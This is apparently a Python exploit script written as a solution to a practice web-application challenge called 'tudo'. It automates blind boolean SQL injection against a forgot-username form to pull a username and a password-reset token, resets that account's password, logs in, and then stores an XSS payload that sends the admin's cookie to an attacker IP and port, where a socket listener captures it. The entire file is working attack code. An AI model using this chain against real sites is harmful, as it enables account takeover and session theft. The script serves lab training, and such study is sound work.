#Solution for admin user auth bypass for bmdyy's tudo challenge
#Link to Challenge: https://github.com/bmdyy/tudo
#PoC Author: ApexPredator
#socket to recieve cookie portion of code borrowed from bmdyy's solution
import requests, argparse, sys, subprocess, socket

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='Target URL', required=True)
parser.add_argument('-p','--password', help='Password to set', required=True)
parser.add_argument('-i','--ip', help='Attacker IP', required=True)
parser.add_argument('-pt','--port', help='Attacker port', required=True)
args = parser.parse_args()
s = requests.session()

def forgot_username_sqli(target, inj_str):

    for j in range(32, 126):
        # now we update the sqli
        url = "http://%s/forgotusername.php" %target
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = "username=%s" %inj_str.replace("[CHAR]", str(j))
        r = requests.post(url, headers=headers, data=data)
        content_length = int(r.headers['Content-Length'])
        if (content_length < 1480):
            return j
    return None


def inject(r, inj, target):

    extracted = ""
    for i in range(1, r):
        injection_string = "1'/**/or/**/(ascii(substring((%s),%d,1)))/**/=/**/[CHAR]/**/limit/**/1;/**/--/**/" % (inj,i)
        retrieved_value = forgot_username_sqli(target, injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n[+] SQL Injection complete!")
            break
    return extracted

def request_token(target, username):

    url = "http://%s/forgotpassword.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "username=%s" %username
    r = requests.post(url, headers=headers, data=data)
    return

def reset_password(target, token, password):

    url = "http://%s/resetpassword.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "token=%s&password1=%s&password2=%s" %(token, password, password)
    r = requests.post(url, headers=headers, data=data)
    if "Password changed!" in r.text:
        print("[+] Password change successful")
    else:
        print("[-] Password change failed :-(")

    return

def login(target, username, password):

    print("[+] logging in to target with username: "+username+" and password: "+password+"....")
    url = "http://%s/login.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username":"%s" %username, "password":"%s" %password}
    r = s.post(url, headers=headers, data=data, allow_redirects=False)
    if (r.status_code == 302):
        print("[+] Login successful!")
    else:
        print("[-] Login failed :-(")
        sys.exit(-1)

    return

def update_description(target, ip, port):

    print("[+] Attempting to update desciption to inject cookie stealing XSS payload...")
    url = "http://%s/profile.php" %target
    data = {"description":"<script>document.write('<img src=http://%s:%s/'+document.cookie+' />');</script>" %(ip, port)}
    r = s.post(url, data=data)
    if "Success" in r.text:
        print("[+] Description updated")
    else:
        print("[-] Description update failed :-(")
        sys.exit(-1)

    return

def setup_socket(ip, port):

    print("[+] Setting up socket to recieve cookie....")
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    port = int(port)
    sock.bind((ip,port))
    sock.listen()

    print("[*] Waiting for admin to trigger XSS...")
    (sock_c, ip_c) = sock.accept()
    get_request = sock_c.recv(4096)
    admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")

    print("[+] Stole admin's cookie:")
    print("    -- " + admin_cookie)
    return admin_cookie

def main():

    try:
        target = args.target
        password = args.password
        ip = args.ip
        port = args.port
    except IndexError:
        print("[-] Usage python3 %s -t <target IP> -p <Password to set> -i <Attacker IP> -pt <Attacker port>" % sys.argv[0])
        print("[-] eg: python3 %s -t 172.17.0.2 -p Offsec123 -i 172.17.0.1 -pt 443" % sys.argv[0])
        sys.exit(-1)

    print("[+] Attempting to pull username via SQLI...")
    query = "select/**/username/**/from/**/users/**/where/**/uid/**/=/**/2"
    username = inject(10, query, target)
    print("[+] Requesting password reset token")
    request_token(target, username)
    print("[+] Attempting to pull token for "+username+" via SQLi...")
    query = "select/**/token/**/from/**/tokens/**/where/**/uid/**/=/**/2/**/limit/**/1"
    token = inject(33, query, target)
    print("\n[+] Resetting password for "+username+" to offsec123...")
    reset_password(target, token, password)
    login(target, username, password)
    update_description(target, ip, port)
    cookie = setup_socket(ip, port)

if __name__ == "__main__":
    main()
